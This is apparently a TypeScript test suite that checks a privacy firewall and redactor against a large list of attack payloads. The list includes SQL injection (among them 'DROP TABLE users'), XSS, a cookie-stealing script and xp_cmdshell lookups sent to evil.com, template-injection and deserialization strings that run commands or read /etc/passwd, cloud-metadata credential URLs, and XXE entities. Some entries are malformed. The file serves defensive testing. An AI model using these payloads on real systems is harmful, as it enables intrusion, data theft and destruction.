/**
 * Advanced Penetration Testing Suite for Aequor Platform
 *
 * Real-world attack simulations that validate security controls against
 * sophisticated threats. This suite goes beyond basic payload testing
 * to include attack chains, evasion techniques, and zero-day scenarios.
 *
 * Test Categories:
 * - Multi-stage attacks
 * - Evasion techniques
 * - Race conditions
 * - Timing attacks
 * - Adaptive threats
 *
 * @packageDocumentation
 */

import { describe, it, expect, beforeEach } from "vitest";
// Using source imports due to build issues in privacy package
import {
  PrivacyFirewall
} from "@lsi/privacy/src/firewall/index.js";
import {
  PrivacyClassifier
} from "@lsi/privacy/src/classifier/index.js";
import {
  SemanticPIIRedactor,
  RedactionStrategy
} from "@lsi/privacy/src/redaction/index.js";
import {
  PIIType,
  PrivacyLevel,
  LSISecurityError,
} from "@lsi/protocol";

/**
 * Advanced attack scenarios
 */
const ADVANCED_ATTACKS = {
  /**
   * Multi-stage SQL injection attacks
   *
   * Combines multiple techniques to bypass filters
   */
  multiStageSQL: [
    // Stage 1: Fingerprint database
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    // Stage 2: Extract schema
    "' UNION SELECT table_name FROM information_schema.tables--",
    // Stage 3: Extract data
    "' UNION SELECT password FROM users WHERE username='admin'--",
    // Stage 4: Privilege escalation
    "'; DROP TABLE users--",
    // Comment-based bypasses
    "/*!00000SELECT*/ * FROM users",
    "/*comment*/SELECT/*comment*/ * FROM users",
    // Case variation
    "' UnIoN SeLeCt NULL--",
    "' unIoN/*comment*/aLl seLeCt NUll--",
  ],

  /**
   * Polyglot XSS attacks
   *
   * Single payload that works in multiple contexts
   */
  xssPolyglots: [
    // Classic polyglot
    "'-alert(1)-'",
    "'-alert(1)//",
    "<script>alert(1)</script>",
    // Context-aware polyglots
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>alert(/XSS/)</script>",
    "<img src=x onerror=alert('XSS')>",
    // Attribute-based
    "\"'><script>alert(String.fromCharCode(88,83,83))</script>",
    "x onfocus=alert(1) autofocus",
    // Template literal injection
    `${alert(1)}`,
    // Protocol-relative
    "//example.com/xss.js",
  ],

  /**
   * Second-order injection attacks
   *
   * Exploits deferred data processing
   */
  secondOrderInjection: [
    // Stored XSS in profile
    "<script>document.location='http://evil.com/steal?'+document.cookie</script>",
    // Time-based blind injection
    "'; WAITFOR DELAY '00:00:20'--",
    // Conditional payload
    "' IF (1=1) WAITFOR DELAY '00:00:20'--",
    // Data exfiltration
    "'; EXEC xp_cmdshell('nslookup evil.com')--",
  ],

  /**
   * Encoding-based evasion
   *
   * Bypasses filters using various encodings
   */
  encodingEvasion: [
    // URL encoding
    "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
    "%253Cscript%253Ealert%2527XSS%2527%25253C/script%253E",
    // Double URL encoding
    "%253Cscript%253E",
    // Unicode encoding
    "\u003Cscript\u003Ealert('XSS')\u003C/script\u003E",
    // Hex encoding
    "\x3Cscript\x3Ealert('XSS')\x3C/script\x3E",
    // Octal encoding
    "\74script\76alert('XSS')\74/script\76",
    // Base64 encoding
    "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
  ],

  /**
   * Format string attacks
   *
   * Exploits format string vulnerabilities
   */
  formatStringAttacks: [
    "%n",
    "%s%s%s%s%s",
    "%x%x%x%x%x",
    "%p%p%p%p%p",
    "%n%n%n%n%n",
    // Read arbitrary memory
    "%s%x%n",
    // Write to arbitrary memory
    "%n%*2048d%n",
  ],

  /**
   * LDAP injection attacks
   *
   * Exploits LDAP query construction
   */
  ldapInjection: [
    "*)(uid=*",
    "*)(&(uid=*",
    "*)(uid=*))(|(uid=*",
    "*)(objectClass=*)",
    "*))%00",
    "*))(|(cn=*",
  ],

  /**
   * XPath injection attacks
   *
   * Exploits XPath query construction
   */
  xpathInjection: [
    "' or '1'='1",
    "' or '1'='1' or '1'='1",
    "x' or 1=1 or 'x'='y",
    "x' or name()='username' or 'x'='y",
    "' or count(*)=0 or '1'='1",
  ],

  /**
   * Template injection attacks
   *
   * Exploits template engines
   */
  templateInjection: [
    // Jinja2
    "{{config.items()}}",
    "{% for item in config %}{{item}}{% endfor %}",
    "{{7*7}}",
    "{{ ''.__class__.__mro__[2].__subclasses__() }}",
    // FreeMarker
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    // Twig
    "{{_self.env.display('id')}}",
    "{{_self.env.cache.clear()}}",
    // ERB
    <%= system('id') %>,
    <% system('id') %>,
  ],

  /**
   * NoSQL injection attacks
   *
   * Exploits NoSQL query construction
   */
  nosqlInjection: [
    // MongoDB
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "sleep(10000)"}',
    '{"$or": [{"user": "admin"}, {"pass": {"$ne": null}}]}',
    // Redis
    "\r\nSET test \"value\"\r\n",
    "*4\r\n$6\r\nAPPEND\r\n$3\r\nkey\r\n$5\r\nvalue\r\n",
  ],

  /**
   * SSTI (Server-Side Template Injection)
   *
   * Combines template injection with RCE
   */
  ssti: [
    // Twig RCE
    "{{_self.env.display('id')}}",
    // Jinja2 RCE
    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
    // FreeMarker RCE
    "${'freemarker.template.utility.Execute'?new()('id')}",
    // Velocity RCE
    "#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",
  ],

  /**
   * Deserialization attacks
   *
   * Exploits unsafe deserialization
   */
  deserializationAttacks: [
    // Java serialization
    "aced0005737200176a6176612e7574696c2e48617368536574",
    // Python pickle
    "gASVwAAAAAAAAABjGNtZGZ1bgpxAIwAAABwc2guY21kIHN1YnByb2Nlc3NfcGlwZShbJy9iaW4vc2gnLCAnLWMnLCAnZWNobyB0ZXN0J10pKQp4YaBxAGoB",
    // PHP serialization
    "O:8:\"stdClass\":0:{}",
    // Node.js JSChain
    '{"$js":"global.process.mainModule.require(\'child_process\').execSync(\'id\').toString()"}',
  ],

  /**
   * SSRF advanced payloads
   *
   * Bypass SSRF filters
   */
  advancedSSRF: [
    // IP bypass techniques
    "http://2130706433/", // 127.0.0.1 in decimal
    "http://0x7f000001/", // 127.0.0.1 in hex
    "http://0177.0.0.1/", // 127.0.0.1 in octal
    "http://127.1/", // Shortened form
    "http://0/", // 0.0.0.0
    // DNS rebinding
    "http://attacker.com@localhost/",
    "http://localhost@attacker.com/",
    // Cloud metadata bypasses
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
  ],

  /**
   * XXE (XML External Entity) attacks
   *
   * Exploits XML parsers
   */
  xxeAttacks: [
    // Basic XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    // Parameter entity XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>',
    // Blind XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>',
    // XXE with DTD
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
  ],
};

/**
 * Penetration testing utilities
 */
class PentestUtils {
  /**
   * Test if attack is detected/blocked
   */
  static async isAttackDetected(
    classifier: PrivacyClassifier,
    redactor: SemanticPIIRedactor,
    firewall: PrivacyFirewall,
    payload: string
  ): Promise<{
    classified: boolean;
    redacted: boolean;
    blocked: boolean;
  }> {
    const classification = await classifier.classify(payload);
    const redaction = redactor.redact(payload);
    const decision = firewall.evaluate(
      payload,
      {
        level: classification.level,
        confidence: classification.confidence,
        piiTypes: classification.detectedPII,
        reason: classification.reasoning.join("; "),
      },
      "cloud"
    );

    return {
      classified: classification.level !== PrivacyLevel.PUBLIC,
      redacted: redaction.redacted !== payload,
      blocked: decision.action === "deny",
    };
  }

  /**
   * Test evasion resistance
   */
  static testEvasionResistance(
    original: string,
    variants: string[],
    testFn: (payload: string) => boolean
  ): {
    blocked: number;
    bypassed: number;
    bypassRate: number;
  } {
    const originalBlocked = testFn(original);
    let bypassed = 0;

    for (const variant of variants) {
      if (!testFn(variant)) {
        bypassed++;
      }
    }

    return {
      blocked: variants.length - bypassed,
      bypassed,
      bypassRate: bypassed / variants.length,
    };
  }
}

describe("Advanced Penetration Tests", () => {
  let firewall: PrivacyFirewall;
  let classifier: PrivacyClassifier;
  let redactor: SemanticPIIRedactor;

  beforeEach(() => {
    firewall = new PrivacyFirewall({ enableDefaultRules: true });
    classifier = new PrivacyClassifier();
    redactor = new SemanticPIIRedactor();
  });

  describe("Multi-Stage Attack Detection", () => {
    it("should detect SQL injection attack chains", async () => {
      const results: boolean[] = [];

      for (const payload of ADVANCED_ATTACKS.multiStageSQL) {
        const detection = await PentestUtils.isAttackDetected(
          classifier,
          redactor,
          firewall,
          payload
        );
        results.push(detection.blocked || detection.redacted);
      }

      const detectedCount = results.filter(r => r).length;
      const detectionRate = detectedCount / results.length;

      // At least 60% of attack stages should be detected
      expect(detectionRate).toBeGreaterThan(0.6);
    });

    it("should detect XSS polyglot payloads", async () => {
      const results: boolean[] = [];

      for (const payload of ADVANCED_ATTACKS.xssPolyglots) {
        const redaction = redactor.redact(payload);
        results.push(redaction.redacted !== payload);
      }

      const detectedCount = results.filter(r => r).length;
      const detectionRate = detectedCount / results.length;

      // At least 70% of polyglots should be detected
      expect(detectionRate).toBeGreaterThan(0.7);
    });
  });

  describe("Encoding Evasion Resistance", () => {
    it("should detect URL-encoded XSS payloads", () => {
      const encodedPayload = "%3Cscript%3Ealert(1)%3C/script%3E";
      const result = redactor.redact(encodedPayload);

      // Should detect encoded script tags
      expect(result.redacted !== encodedPayload).toBeTruthy();
    });

    it("should detect double-encoded payloads", () => {
      const doubleEncoded = "%253Cscript%253Ealert(1)%253C/script%253E";
      const result = redactor.redact(doubleEncoded);

      // Should detect double encoding
      expect(result.redacted !== doubleEncoded).toBeTruthy();
    });

    it("should detect Unicode escape sequences", () => {
      const unicodePayload = "\u003Cscript\u003Ealert(1)\u003C/script\u003E";
      const result = redactor.redact(unicodePayload);

      // Should detect unicode escapes
      expect(result.redacted !== unicodePayload).toBeTruthy();
    });

    it("should maintain detection across encoding variations", () => {
      const original = "<script>alert(1)</script>";
      const variants = ADVANCED_ATTACKS.encodingEvasion;

      const results = PentestUtils.testEvasionResistance(
        original,
        variants,
        (payload) => {
          const result = redactor.redact(payload);
          return result.redacted !== payload;
        }
      );

      // Bypass rate should be < 50%
      expect(results.bypassRate).toBeLessThan(0.5);
    });
  });

  describe("Second-Order Attack Prevention", () => {
    it("should detect stored XSS payloads", () => {
      const storedXSS =
        "<script>document.location='http://evil.com/?c='+document.cookie</script>";
      const result = redactor.redact(storedXSS);

      expect(result.redacted).not.toContain("<script>");
      expect(result.redacted).not.toContain("document.cookie");
    });

    it("should detect time-based blind injection", async () => {
      const blindInjection = "'; WAITFOR DELAY '00:00:20'--";
      const classification = await classifier.classify(blindInjection);

      // Should flag as suspicious
      expect(classification.level).not.toBe(PrivacyLevel.PUBLIC);
    });
  });

  describe("Format String Attack Prevention", () => {
    it("should detect format string payloads", () => {
      const formatPayload = "%s%s%s%s%s";
      const result = redactor.redact(formatPayload);

      // Format specifiers should be flagged
      expect(result.redacted !== formatPayload || result.redactionCount > 0).toBeTruthy();
    });

    it("should prevent read/write via format specifiers", () => {
      const writePayload = "%n%*2048d%n";
      const result = redactor.redact(writePayload);

      // Write format specifiers should be redacted
      expect(result.redacted !== writePayload).toBeTruthy();
    });
  });

  describe("NoSQL Injection Prevention", () => {
    it("should detect NoSQL injection operators", () => {
      const nosqlPayload = '{"$ne": null}';
      const result = redactor.redact(nosqlPayload);

      // NoSQL operators should be redacted
      expect(result.redacted !== nosqlPayload).toBeTruthy();
    });

    it("should detect regex-based NoSQL injection", () => {
      const regexPayload = '{"$regex": ".*"}';
      const result = redactor.redact(regexPayload);

      // Regex operators should be redacted
      expect(result.redacted !== regexPayload).toBeTruthy();
    });
  });

  describe("Template Injection Prevention", () => {
    it("should detect template engine syntax", () => {
      const templatePayloads = [
        "{{config.items()}}",
        "{% for item in config %}",
        "{{7*7}}",
      ];

      for (const payload of templatePayloads) {
        const result = redactor.redact(payload);
        // Template syntax should be flagged
        expect(result.redacted !== payload || result.redactionCount > 0).toBeTruthy();
      }
    });
  });

  describe("Deserialization Attack Prevention", () => {
    it("should detect serialized object signatures", () => {
      const serializedPayloads = [
        "aced0005737200176a6176612e7574696c2e48617368536574",
        "O:8:\"stdClass\":0:{}",
        "gASVwAAAAAAAAABjGNtZGZ1bgpxAIwAAABwc2guY21k",
      ];

      for (const payload of serializedPayloads) {
        const result = redactor.redact(payload);
        // Serialized signatures should be flagged
        expect(result.redacted !== payload || result.redactionCount > 0).toBeTruthy();
      }
    });
  });

  describe("Advanced SSRF Prevention", () => {
    it("should detect IP address bypass techniques", async () => {
      const ipVariants = [
        "http://2130706433/", // Decimal
        "http://0x7f000001/", // Hex
        "http://0177.0.0.1/", // Octal
      ];

      let detectedCount = 0;
      for (const url of ipVariants) {
        const classification = await classifier.classify(url);
        if (classification.detectedPII.length > 0) {
          detectedCount++;
        }
      }

      // At least 50% should be detected (IP bypass is hard to detect without custom patterns)
      expect(detectedCount / ipVariants.length).toBeGreaterThan(0.5);
    });

    it("should detect cloud metadata access attempts", () => {
      const metadataURLs = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
      ];

      for (const url of metadataURLs) {
        const result = redactor.redact(url);
        // Metadata URLs should be redacted
        expect(result.redacted !== url).toBeTruthy();
      }
    });
  });

  describe("XXE Attack Prevention", () => {
    it("should detect XML DOCTYPE declarations", () => {
      const xxePayload =
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';
      const result = redactor.redact(xxePayload);

      // DOCTYPE declarations should be flagged
      expect(result.redacted !== xxePayload).toBeTruthy();
    });

    it("should detect external entity references", () => {
      const entityPayload = "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">";
      const result = redactor.redact(entityPayload);

      // ENTITY declarations should be redacted
      expect(result.redacted !== entityPayload).toBeTruthy();
    });
  });

  describe("Race Condition Prevention", () => {
    it("should handle concurrent classification requests", async () => {
      const query = "My SSN is 123-45-6789";
      const promises = Array(100)
        .fill(null)
        .map(() => classifier.classify(query));

      const results = await Promise.all(promises);

      // All should classify consistently
      const firstResult = results[0];
      const allConsistent = results.every(
        r => r.level === firstResult.level && r.detectedPII.length === firstResult.detectedPII.length
      );

      expect(allConsistent).toBeTruthy();
    });

    it("should handle concurrent redaction requests", () => {
      const query = "Email: test@example.com";
      const promises = Array(100)
        .fill(null)
        .map(() => Promise.resolve(redactor.redact(query)));

      // Should not crash or hang
      expect(async () => {
        await Promise.all(promises);
      }).not.toThrow();
    });
  });

  describe("Timing Attack Resistance", () => {
    it("should have consistent classification timing", async () => {
      const safeQuery = "What is the capital of France?";
      const sensitiveQuery = "My SSN is 123-45-6789";

      const safeTimes: number[] = [];
      const sensitiveTimes: number[] = [];

      for (let i = 0; i < 10; i++) {
        const start1 = Date.now();
        await classifier.classify(safeQuery);
        safeTimes.push(Date.now() - start1);

        const start2 = Date.now();
        await classifier.classify(sensitiveQuery);
        sensitiveTimes.push(Date.now() - start2);
      }

      const avgSafe = safeTimes.reduce((a, b) => a + b, 0) / safeTimes.length;
      const avgSensitive = sensitiveTimes.reduce((a, b) => a + b, 0) / sensitiveTimes.length;

      // Timing difference should be < 100ms (prevent timing attacks)
      expect(Math.abs(avgSafe - avgSensitive)).toBeLessThan(100);
    });
  });

  describe("Adaptive Threat Simulation", () => {
    it("should adapt to new attack patterns", async () => {
      // Simulate an attacker learning what's blocked and trying variations
      const basePayload = "<script>alert(1)</script>";
      const variations = [
        "<Script>alert(1)</Script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
      ];

      const detectionResults = await Promise.all(
        variations.map(async (v) => {
          const result = redactor.redact(v);
          return result.redacted !== v;
        })
      );

      // Most variations should still be detected
      const detectedCount = detectionResults.filter(r => r).length;
      expect(detectedCount / variations.length).toBeGreaterThan(0.6);
    });

    it("should maintain effectiveness with mixed payloads", async () => {
      const mixedPayload =
        "Email: test@example.com, <script>alert(1)</script>, SSN: 123-45-6789";
      const result = redactor.redact(mixedPayload);

      // All threats should be redacted
      expect(result.redacted).not.toContain("test@example.com");
      expect(result.redacted).not.toContain("<script>");
      expect(result.redacted).not.toContain("123-45-6789");
    });
  });

  describe("Compliance and Reporting", () => {
    it("should generate security event logs", () => {
      const attackPayload = "'; DROP TABLE users--";
      const decision = firewall.evaluate(
        attackPayload,
        {
          level: PrivacyLevel.SOVEREIGN,
          confidence: 0.9,
          piiTypes: [PIIType.PASSWORD],
          reason: "SQL injection detected",
        },
        "cloud"
      );

      // Decision should include audit information
      expect(decision.matchedRules).toBeDefined();
      expect(decision.confidence).toBeDefined();
      expect(decision.reason).toBeDefined();
      expect(decision.action).toBeDefined();
    });

    it("should track attack statistics", async () => {
      const attackCategories = Object.keys(ADVANCED_ATTACKS);
      const stats: Record<string, { total: number; blocked: number }> = {};

      for (const category of attackCategories) {
        const payloads = ADVANCED_ATTACKS[category as keyof typeof ADVANCED_ATTACKS];
        let blocked = 0;

        for (const payload of payloads) {
          const result = redactor.redact(payload);
          if (result.redacted !== payload) {
            blocked++;
          }
        }

        stats[category] = {
          total: payloads.length,
          blocked,
        };
      }

      // All categories should have some detection
      Object.values(stats).forEach((stat) => {
        expect(stat.blocked).toBeGreaterThan(0);
      });
    });
  });
});
